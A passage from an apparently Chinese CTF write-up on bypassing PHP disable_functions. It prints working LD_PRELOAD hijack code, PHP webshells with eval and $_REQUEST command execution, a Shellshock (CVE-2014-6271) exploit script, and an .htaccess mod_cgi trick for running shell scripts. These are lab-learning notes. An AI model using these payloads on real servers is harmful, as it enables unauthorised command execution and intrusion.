class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;stdlib.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span>        </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;string.h&gt;</span> </span><br><span class="line"> </span><br><span class="line">void payload()&#123; #这里写系统命令</span><br><span class="line">system(&quot;/readflag &gt;/tmp/hacker&quot;); #调用readflag脚本，把内容写道/tmp下的hack文件里面</span><br><span class="line">&#125;   </span><br><span class="line"> </span><br><span class="line">int geteuid()&#123;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">环境变量LD_PRELOAD如果存在先清除它</span></span><br><span class="line">if(getenv(&quot;LD_PRELOAD&quot;) == NULL)</span><br><span class="line">&#123; </span><br><span class="line">return 0; </span><br><span class="line">&#125;</span><br><span class="line">unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><pre><code class="language-shell">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#__attribute__((__constructor__)) 先于main()函数调用 __attribute__ ((__constructor__)) void angel (void)&#123;    unsetenv(&quot;LD_PRELOAD&quot;);   # 删除原来的环境变量    system(&quot;/readflag &gt; /tmp/hacker&quot;);#将所读文件放到tmp中的hack中&#125;<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">两个写法都行，但是我选的是第一种（虽然第二种应该更好），但是我认为第一个好理解一点</span><br><span class="line"></span><br><span class="line">但他们的主要思想就是先删除原本的环境变量，构建payload</span><br><span class="line"></span><br><span class="line">记得编译成.os文件，我是在kali里面编译的</span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line">gcc -fPIC -shared <span class="number">1</span>.c -o hack.so</span><br></pre></td></tr></table></figure></code></pre></li></ol><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/13.png" alt=""></p><p>然后文件上传到<code>/tmp/</code>下</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/15.png" alt=""></p><p>利用<code>putenv</code>（添加环境变量）设置LD_PRELOAD为我们的恶意动态链接库文件的路径</p><p>配合php的某个函数去<strong>触发我们的恶意动态链接库文件</strong></p><p>一般好像也会用emil，但是这里被ban了</p><p>可以通过插件查看</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/ShellShock/10.png" alt=""></p><blockquote><p>如果可以直接写成这样就行了</p><p>mail(“”, “”, “”, “”);</p></blockquote><p>我们还有error_log()函数可以用</p><p><a href="https://www.runoob.com/php/func-error-log.html">error_log() 函数解释</a></p><blockquote><p>error_log(error,type,destination,headers)：<br>当type为1时，服务器就会把error发送到参数 destination 设置的邮件地址</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD=/tmp/hack.so&quot;);#路径不要写错</span><br><span class="line">error_log(&quot;&quot;,1,&quot;&quot;,&quot;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>文件上传到<code>var/www/html/</code></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/12.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/14.png" alt=""></p><p>然后去访问<code>1.php页面</code>,去<code>/tmp</code>文件下就能看到生成的hacker文件了,打开就能看到flag</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/16.png" alt=""></p><p>这里解释一下细节</p><p>1.为什么要用getuid这个函数？</p><blockquote><p>因为我们是要劫持某个某个函数，而被劫持的函数得由我们来自己实现一次，所以函数原型必须一致，这就好说了，为了减少工作量，减少复杂性，所以我们尽量选择那些没有参数的系统函数，getuid就是这样的一个函数</p></blockquote><h6 id="更多方法">更多方法</h6><p>这个其实和上传os文件的思路差不多<a href="https://xz.aliyun.com/t/4623#toc-4">Bypass disabled_functions一些思路总结 - 先知社区 (aliyun.com)</a></p><p>这个我试了一下，把所有文件都上传，但是没有什么反应（可能是我方法错了，会的人能教教我吗😭）</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/17.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/18.png" alt=""></p><p><a href="https://www.freebuf.com/articles/web/192052.html">无需sendmail：巧用LD_PRELOAD突破disable_functions</a></p><h5 id="2-ShellShock">2.ShellShock</h5><blockquote><p>利用PHP破壳完成 Bypass</p></blockquote><p>推荐先看下这篇对ShellShock漏洞的讲解（好像当年确实挺严重的）<a href="https://www.linuxidc.com/Linux/2014-10/108239.htm">破壳漏洞(Shellshock)分析CVE-2014-6271</a></p><p><a href="https://www.cnblogs.com/qmfsun/p/7591757.html">Bash远程代码执行漏洞(CVE-2014-6271)案例分析 - Agoly - 博客园 (cnblogs.com)</a></p><blockquote><p><strong>漏洞原理：</strong><br>目前的Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p></blockquote><p>去github上也能找到介绍👉<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/2">官方题解</a></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/ShellShock/1.png" alt=""></p><h6 id="1-蚁剑-2">1.蚁剑</h6><p>使用蚁剑</p><p>需要注意的是直接连好像会出错</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/ShellShock/2.png" alt=""></p><p>汗一个编译器就行</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/ShellShock/3.png" alt=""></p><p>然后进去发现连查看其他文件的权限都没有</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/ShellShock/4.png" alt=""></p><p>但是这里我们可以使用插件<code>绕过disable_functions</code>,模式记得选Apache_mod_cgi</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/ShellShock/13.png" alt=""></p><p>然后用终端就能找到flag了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/ShellShock/14.png" alt=""></p><h6 id="2-手工-2">2.手工</h6><p>我找到了三个脚本</p><p>1.利用error_log函数</p><p>通过查看phpinfo发现没有ban掉error_log</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/ShellShock/10.png" alt=""></p><p>然后上传脚本</p><p>error_log和mail两个函数，都可以使用，（为了避免ban掉一个）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//默认putenv定义的环境变量名必须以PHP_开头。error_log()函数会在执行sh -c -t -i触发payload</span></span><br><span class="line"><span class="comment">//sh -c -t -i:启动一个Bourne shell，让它执行一个命令字符串（这里没有提供具体的命令字符串），然后输出一个NULL字符并退出，同时保持交互式模式</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ant&#x27;</span>]);</span><br><span class="line">  <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_test=() &#123; :; &#125;; tac /flag &gt;&gt; /var/www/html/test.php&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">error_log</span>(<span class="string">&quot;admin&quot;</span>,<span class="number">1</span>);</span><br><span class="line">  <span class="comment">//mail(&quot;admin@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/ShellShock/11.png" alt=""></p><p>也能看到error_log()函数会在执行sh -c -t -i</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/ShellShock/12.png" alt=""></p><p>去test.php页面下就有flag了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/ShellShock/8.png" alt=""></p><p>然后就是下面两个脚本，我都不行，可能是使用方法问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//蚁剑提供的</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$d</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;error_log&#x27;</span>) || <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;mail&#x27;</span>)))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="title function_ invoke__">readlink</span>(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>)!=<span class="literal">FALSE</span>)&#123;</span><br><span class="line">      <span class="variable">$tmp</span>=<span class="title function_ invoke__">tempnam</span>(<span class="title function_ invoke__">sys_get_temp_dir</span>(), <span class="string">&#x27;as&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;error_log&#x27;</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">error_log</span>(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">error_log</span>(<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">mail</span>(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">&quot;Not vuln (not bash)\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$output</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp</span>);</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$output</span>!=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="variable">$output</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">&quot;No output, or not vuln.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;不满足使用条件&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// runcmd(&quot;whoami&quot;); // 要执行的命令</span></span><br><span class="line"><span class="title function_ invoke__">runcmd</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]); <span class="comment">// ?cmd=whoami</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以及下面这个：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span></span><br><span class="line"><span class="comment"># Google Dork: none </span></span><br><span class="line"><span class="comment"># Date: 10/31/2014 </span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall) </span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net </span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2) </span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6 </span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span></span><br><span class="line">   <span class="variable">$tmp</span> = <span class="title function_ invoke__">tempnam</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;data&quot;</span>); </span><br><span class="line">   <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$cmd</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>); </span><br><span class="line">   <span class="comment">// In Safe Mode, the user may only alter environment variableswhose names </span></span><br><span class="line">   <span class="comment">// begin with the prefixes supplied by this directive. </span></span><br><span class="line">   <span class="comment">// By default, users will only be able to set environment variablesthat </span></span><br><span class="line">   <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, </span></span><br><span class="line">   <span class="comment">// PHP will let the user modify ANY environment variable! </span></span><br><span class="line">   <span class="title function_ invoke__">mail</span>(<span class="string">&quot;a@127.0.0.1&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;-bv&quot;</span>); <span class="comment">// -bv so we don&#x27;t actuallysend any mail</span></span><br><span class="line">   <span class="variable">$output</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp</span>); </span><br><span class="line">   @<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp</span>); </span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) <span class="keyword">return</span> <span class="variable">$output</span>; </span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">&quot;No output, or not vuln.&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shellshock</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一个来自蚁剑</p><p>第二个出处<a href="https://www.secpulse.com/archives/2300.html">PHP Execute Command Bypass Disable_functions With Shellshock - SecPulse.COM | 安全脉搏</a></p><p><a href="https://www.exploit-db.com/exploits/35146">PHP &lt; 5.6.2 - ‘Shellshock’ 安全模式/disable_functions绕过/命令注入 - PHP webapps 漏洞利用 (exploit-db.com)</a></p><p>失败截图</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/ShellShock/7.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/ShellShock/6.png" alt=""></p><p>有知道的大佬教我一下😭</p><h6 id="更新">更新</h6><p>果然还是看不懂源码的痛</p><p>把代码换成这个就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span></span><br><span class="line"><span class="comment"># Google Dork: none </span></span><br><span class="line"><span class="comment"># Date: 10/31/2014 </span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall) </span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net </span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2) </span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6 </span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span></span><br><span class="line">   <span class="variable">$tmp</span> = <span class="title function_ invoke__">tempnam</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;data&quot;</span>); </span><br><span class="line">   <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$cmd</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>); </span><br><span class="line">   <span class="comment">// In Safe Mode, the user may only alter environment variableswhose names </span></span><br><span class="line">   <span class="comment">// begin with the prefixes supplied by this directive. </span></span><br><span class="line">   <span class="comment">// By default, users will only be able to set environment variablesthat </span></span><br><span class="line">   <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, </span></span><br><span class="line">   <span class="comment">// PHP will let the user modify ANY environment variable! </span></span><br><span class="line">   <span class="title function_ invoke__">mail</span>(<span class="string">&quot;a@127.0.0.1&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;-bv&quot;</span>); <span class="comment">// -bv so we don&#x27;t actuallysend any mail</span></span><br><span class="line">   <span class="title function_ invoke__">error_log</span>(<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">   <span class="variable">$output</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp</span>); </span><br><span class="line">   @<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp</span>); </span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) <span class="keyword">return</span> <span class="variable">$output</span>; </span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">&quot;No output, or not vuln.&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shellshock</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/ShellShock/16.png" alt=""></p><p>就是那个可用函数的问题，不能用mail，换成error_log就行了，但是蚁剑那个代码我换了之后还是不行。。。后面有时间在看了（又花了我50大米😭）</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/ShellShock/18.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/ShellShock/17.png" alt=""></p><p><a href="https://www.anquanke.com/post/id/208451#h2-4">bypass disable_function多种方法+实例-安全客 - 安全资讯平台 (anquanke.com)</a></p><h5 id="3-Apache-Mod-CGI">3.Apache Mod CGI</h5><p>👉<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/3">官方题解</a></p><blockquote><p>了解 Apache Mod CGI 为什么会 Bypass disable_function</p></blockquote><p>上面的FastCGI已经详解过了CGI了，这里大概给个解释</p><blockquote><p>CGI：<br>CGI简单说来便是放在服务器上的可执行程序,CGI编程没有特定的语言,C语言,linux shell,perl,vb等等都可以进行CGI编程.<br>MOD_CGI：<br>任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中.</p></blockquote><h6 id="1-蚁剑-3">1.蚁剑</h6><p>进去看到</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/Apache%20Mod%20CGI/1.png" alt=""></p><p>点击GetFlag看到注入的一句话小马</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/Apache%20Mod%20CGI/2.png" alt=""></p><p>点击重置（欸，没发现什么作用）</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/Apache%20Mod%20CGI/3.png" alt=""></p><p>流程先走一遍</p><p>能用蚁剑连，但是<code>/flag</code> 这个文件是 644 权限，<code>www-data</code> （write-write-write)用户无法通过读文件的形式读到内容, 需要执行拥有 SUID 权限的 <code>tac</code> 命令(具体看 <code>/start.sh</code>)来获取 flag</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/Apache%20Mod%20CGI/4.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/Apache%20Mod%20CGI/5.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/Apache%20Mod%20CGI/6.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/Apache%20Mod%20CGI/7.png" alt=""></p><p>使用「绕过 disable_functions」插件, 选择 <code>Apache_mod_cgi</code> 模式进行</p><p>使用条件</p><ol><li>必须是apache环境</li><li>mod_cgi已经启用</li><li>必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none</li><li>必须有权限写.htaccess文件</li></ol><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/Apache%20Mod%20CGI/8.png" alt=""></p><p>点击「开始」按钮后，成功之后, 会创建一个新的「虚拟终端」</p><p>尝试执行命令, 成功获取flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/readflag</span><br></pre></td></tr></table></figure><h6 id="2-手工-3">2.手工</h6><p>其实原理就是利用.htaccess</p><blockquote><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p></blockquote><p>如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令。<br>这里的.htaccess文件，将所有<code>.ant</code>后缀的文件作为cgi脚本执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI #表示允许CGI执行，如果AllowOverride只有FileInfo权限且本身就开启了ExecCGI的话，就可以不需要这句话了</span><br><span class="line">AddHandler cgi-script .ant #告诉Apache将xx后缀名的文件当作CGI程序进行解析</span><br></pre></td></tr></table></figure><p>再写一个shell.ant文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line">echo&amp;&amp;cd &quot;/var/www/html/backdoor&quot;;tac /flag;</span><br></pre></td></tr></table></figure><p>上传后自动生成.htaccess.bak文件</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/Apache%20Mod%20CGI/9.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/Apache%20Mod%20CGI/11.png" alt=""></p><p>然后访问shell.ant就能执行里面的脚本了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/Apache%20Mod%20CGI/12.png" alt=""></p><h5 id="4-PHP-FPM">4.PHP-FPM</h5><p>👉<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5">官方题解</a></p><blockquote><p>正常情况下, PHP-FPM 是不会对外开放的。在有 webshell 之后，这就变得不一样了。学习通过攻击 PHP-FPM 达到 Bypass 的目的。</p></blockquote><p>前提知识：</p><blockquote><p>php-fpm即php-Fastcgi Process Manager.<br>php-fpm是 FastCGI 的实现，并提供了进程管理的功能。<br>进程包含 master 进程和 worker 进程两种进程。<br>master 进程只有一个，负责监听端口，接收来自 Web Server 的请求，而 worker 进程则一般有多个(具体数量根据实际需要配置)，每个进程内部都嵌入了一个 PHP 解释器，是 PHP 代码真正执行的地方。</p></blockquote><p><strong>总结来说php-fpm是一个fastcgi协议解析器，负责按照fastcgi的协议将TCP流解析成真正的数据</strong></p><p>**PHP-FPM默认监听9000端口，我们可以自己构造fastcgi协议，和fpm进行通信。**于是就有了利用 WebShell 直接与 PHP FastCGI (FPM) 来实现Bypass Disable Functions</p><h6 id="蚁剑">蚁剑</h6><p><img 